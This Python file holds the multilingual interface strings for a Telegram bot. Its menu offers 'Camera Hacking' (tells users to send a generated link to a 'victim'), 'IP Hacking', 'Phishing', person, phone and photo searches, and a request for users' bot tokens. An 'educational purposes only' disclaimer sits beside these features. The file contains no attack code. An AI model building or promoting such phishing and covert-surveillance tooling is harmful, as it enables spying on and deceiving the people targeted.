from telebot import types
from create_bot import bot

def language_selection_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=2)
    buttons = [
        types.InlineKeyboardButton("🇬🇧 English", callback_data='lang_en'),
        types.InlineKeyboardButton("🇷🇺 Русский", callback_data='lang_ru'),
        types.InlineKeyboardButton("🇺🇿 O'zbekcha", callback_data='lang_uz')
    ]
    markup.add(*buttons)
    return markup




def get_text(key, language):
    translations = {
        'start_message': {
            'en': "Welcome! Please select an option below:",
            'ru': "Добро пожаловать! Выберите один из вариантов ниже:",
            'uz': "Xush kelibsiz! Iltimos, quyidagi variantlardan birini tanlang:"
        },
        'main_menu_caption': {
            'en': "Main menu\n\n🆔 Your ID: {id}\n👤 Your name: {name}",
            'ru': "Главное меню\n\n🆔 Ваш ID: {id}\n👤 Ваше имя: {name}",
            'uz': "Asosiy menyusi\n\n🆔 Sizning ID: {id}\n👤 Sizning ismingiz: {name}"
        },
        'back_btn': {
            'en': 'Back',
            'ru': 'Назад',
            'uz': 'Orqaga'
        },
        'contacnt_btn': {
          'en': 'Contact to Developer',
          'ru': 'Связь с админом',
            'uz': 'Admin bilan bog\'lanish'
        },
        'camera_btn': {
          'en': '👨‍💻 Camera Hacking',
          'ru': '👨‍💻 Взломать камеру',
          'uz': '👨‍💻 Kamera hacklash'
        },
        'ip_btn': {
          'en' : '📍 IP Hacking',
          'ru': '📍 Пробив по IP',
            'uz': '📍 IP hacklash'
        },
        'cerate_bot_btn': {
            'en': 'Create bot',
            'ru': 'Создать бота',
            'uz': 'Bot yaratish'
        },
        'language_btn': {
            'en': '🇺🇸en/🇷🇺ru/🇺🇿uz',
            'ru': '🇺🇸en/🇷🇺ru/🇺🇿uz',
            'uz': '🇺🇸en/🇷🇺ru/🇺🇿uz'
        },
        'searchPhone_btn': {
            'en': '🔍 SearchPhone',
            'ru': '🔍 Поиск номера',
            'uz': '🔍 Raqam qidirish'
        },
        'searchUser_btn': {
            'en': '🔍 SearchUser',
            'ru': '🔍 Поиск человека',
            'uz': '🔍 Odami qidirish'
        },
        'search_photo_btn': {
            'en': '🔍 SearchPhoto',
            'ru': '🔍 Поиск фото',
            'uz': '🔍 Rasm qidirish'
        },
        'cameraHack_page': {
            'en': "Create the link and send it to the victim\n\n {link}",
            'ru': 'Создайте ссылку и отправьте жертве \n\n {link}',
            'uz': 'Havolani yaratib, unga qurbaningizga yuboring\n\n {link}'
        },
        'search_photo_page': {
            'en': "Send the photo to search\n\n",
            'ru': 'Отправьте фото для поиска\n\n ',
            'uz': 'Rasmni qidirish uchun havolani yuboring\n\n'
        },
        'ipHack_page': {
            'en': 'Send me IP address',
            'ru': 'Отравьте сюда IP адрес',
            'uz': 'IP manzilini yuboring'
        },
        'chatGpt_page': {
            'en': """You are in dialogue with Igor\\. Send your request in text format\\. Igor only understands Russian\\.
> Press\\ __Back__\\ to exit\\.
""",
            'ru': """Вы находитесь в диалоге с Игорем\\. Отправьте свой запрос в текстовом формате\\. Сегодня у Игоря нет настроения\\.
> Нажмите\\ __Назад__\\ чтобы выйти\\.""",
            'uz': """Siz Igor bilan muloqotda ekansiz\\. So'rovingizni matn shaklida yuboring\\.""",
        },
        'acountHack_btn': {
            'en': '🚫 Phishing',
            'ru': '🚫 Фишинг',
            'uz': '🚫 Phishing'
        },
        'acountHack_page': {
            'en': 'Test link',
            'ru': 'Тестовая ссылка',
            'uz': 'Test ssilka'
        },
        'contactMe_page': {
            'en': 'send me question',
            'ru': 'есть вопрос? можешь написать его сюда',
            'uz': 'savol yuborish'
        },
        'pagination': {
            'en': '➡️ Next',
            'ru': '➡️ Вперед',
            'uz': '➡️ Keyingi'
        },
        'tts_page': {
            'en': 'Send me some text\n\n--click on back to leave this page',
            'ru': 'Отправьте мне текст\n\n--Нажмите back чтобы завершить',
            'uz': 'Matn yuboring\n\n--Chiqish uchun orqaga bosing'
            
        },
        'cameraHackBtn': {
            'en': 'Create Link',
            'ru': 'Создать ссылку',
            'uz': 'ssilka yaratish' 
            
        },
        'ipError': {
            'en': 'ERROR. Enter a correct IP address.',
            'ru': 'Ошибка. Введите действительный IP адрес.'  ,
            'uz': "XATO. To'gri IP manzilini kiriting."
        },
        'warrning': {
            'en': '<blockquote>If you use this bot, you agree to be bound by our terms.\nThis bot is for educational purposes only.\nI am not responsible for any illegal activities that may occur as a result of using this bot.\nIf you use this bot, you do so at your own risk.</blockquote>',
            'ru': '<blockquote>Если вы используете этого бота, вы соглашаетесь соблюдать наши условия.\nЭтот бот предназначен только для образовательных целей.\nЯ не несу ответственности за любые незаконные действия, которые могут произойти в результате использования этого бота.\nЕсли вы используете этого бота, вы делаете это на свой страх и риск.</blockquote>',
            'uz': '<blockquote>Agar siz ushbu botdan foydalansangiz, bizning shartlarimizga rozilik bildirasiz.\nBu bot faqat taʼlim maqsadlarida.\nMen ushbu botdan foydalanish natijasida yuzaga kelishi mumkin bo\'lgan har qanday noqonuniy harakatlar uchun javobgar emasman.\nAgar siz ushbu botdan foydalansangiz, buni o\'zingizning xavf-xataringiz ostida qilasiz.</blockquote>'

        },
        'thanks': {
            'en': 'Thanks',
            'ru': 'Спасибо',
            'uz': 'Rahmat'
        },
        'phone_user': {
            'en': '🔍 Enter the phone number you want to search for',
            'ru': '🔍 Отправьте номер телефона',
            
        },
        'search_user': {
            'en': '🔍 Enter the username you want to search for',
            'ru': '🔍 Введите имя пользователя, которое хотите найти',
            'uz': '🔍 Qidirayotgan foydalanuvchi nomini kiriting'
        },
        'searching': {
            'en': '⏳ Searching: {username}\nThis may take about 30 seconds\nPlease wait...',
            'ru': '⏳ Ищу: {username}\nЭто может занять окало 30сек\nПожалуйста, подождите...',
            'uz': '⏳ Qidirilyapti: {username}\nBu taxminan 30 soniya davom etishi mumkin\nIltimos, kuting...'
        },
        'search_results': {
            'en': '🔎 Results for `{username}` — {count} found',
            'ru': '🔎 Результаты поиска для `{username}` — {count} найдено',
            'uz': '🔎 `{username}` uchun natijalar — {count} topildi'
        },
        'no_results': {
            'en': '❌ Nothing found.',
            'ru': '❌ Ничего не найдено.',
            'uz': '❌ Hech narsa topilmadi.'
        },
        'pagination_prev': {
            'en': '⬅ Prev',
            'ru': '⬅ Назад',
            'uz': '⬅ Orqaga'
        },
        'pagination_next': {
            'en': 'Next ➡',
            'ru': 'Вперед ➡',
            'uz': 'Keyingi ➡'
        },
        "subscribe": {
            'en': "Subscribe",
            'ru': "Подпишитесь",
            'uz': "Kanalga obuna bo'ling"
        },
        
        'create_bot': {
            'en': 'Create bot',
            'ru': 'Создать бота',
            'uz': 'Bot yaratish'
        },
        'create_bot_page': {
            'en': """
🇷🇺 Как создать своего бота и отправить токен:

Перейдите в Telegram и найдите @BotFather.

Напишите команду /newbot и следуйте инструкциям (введите имя и юзернейм бота).

Получите токен (длинная строка вроде 123456:ABC-DEF...).

Отправьте этот токен сюда, чтобы бот начал работать.
            """,
            'ru': """
🇬🇧 How to create your own bot and send the token:

Open Telegram and search for @BotFather.

Type /newbot and follow the instructions (choose a name and a username).

You will get a token (a long string like 123456:ABC-DEF...).

Send this token here to activate your bot.
            """,
            'uz': """
🇺🇿 Bot yaratish va token yuborish:

Telegram oching va @BotFather botini qidiring.

/newbot deb yozing va ko‘rsatmalarga amal qiling (nom va username tanlang).

Sizga token beriladi (123456:ABC-DEF... kabi).

Shu yerga tokenni yuboring — botingiz ishga tushadi.
            """,
            
        },        
        'download_btn': {
            'en': '📥 Download video',
            'ru': '📥 Скачать видео',
            'uz': '📥 Video yuklab olish'
        },
        'download_prompt': {
            'en': 'Send me the URL of the video you want to download',
            'ru': 'Отправьте ссылку на видео, которое нужно скачать',
            'uz': 'Yuklamoqchi bo‘lgan videoning URL manzilini yuboring'
        },
        "statistics": {
                'en': "📊 Your bot statistics:\n\n💬 Total messages: {total_messages}\n\n👤 Users: {total_users}",
                'ru': "📊 Статистика вашего бота:\n\n💬 Всего сообщений: {total_messages}\n\n👤 Пользователей: {total_users}",
                'uz': "📊 Bot statistikasi:\n\n💬 Jami xabarlar: {total_messages}\n\n👤 Foydalanuvchilar: {total_users}",
            },
    }
    return translations.get(key, {}).get(language, key)




@bot.callback_query_handler(func=lambda call: call.data == 'change_language')
async def change_language(call):
    
    
    markup = language_selection_keyboard()
    img = open('./img/main.jpeg', 'rb')
    caption_text = "Select your language / Выберите язык:"
    media = types.InputMediaPhoto(media=img, caption=caption_text)
    
    await bot.edit_message_media(chat_id=call.message.chat.id, message_id=call.message.id, media=media, reply_markup=markup)
    img.close()